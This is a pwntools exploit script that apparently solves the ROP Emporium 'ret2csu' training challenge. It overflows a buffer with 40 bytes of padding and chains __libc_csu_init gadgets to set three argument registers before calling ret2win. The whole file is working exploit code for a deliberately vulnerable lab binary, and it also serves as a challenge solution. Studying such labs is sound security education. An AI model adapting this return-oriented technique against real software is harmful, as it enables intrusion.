from pwn import *

elf = context.binary = ELF("./ret2csu")
r = process()

win = p64(elf.sym["ret2win"])

POP_RDI = p64(0x00000000004006a3)
POP_RBX_RBP_R12_R13_R14_R15 = p64(0x0040069a)
MOV_RDX = p64(0x00400680) #MOV RDX, R15 | MOV RSI, R14 | MOV EDI, R13D | CALL qword ptr [R12 + RBX*0x8]

arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)

def set_args():
    return POP_RBX_RBP_R12_R13_R14_R15 + p64(0) + p64(1) + p64(0x00600e48) + arg1 +  arg2 + arg3 + MOV_RDX + p64(0)*7 + POP_RDI + arg1 + p64(elf.plt["ret2win"])

#gdb.attach(r)

payload = b"A"*40 + set_args()

r.sendline(payload)
r.interactive()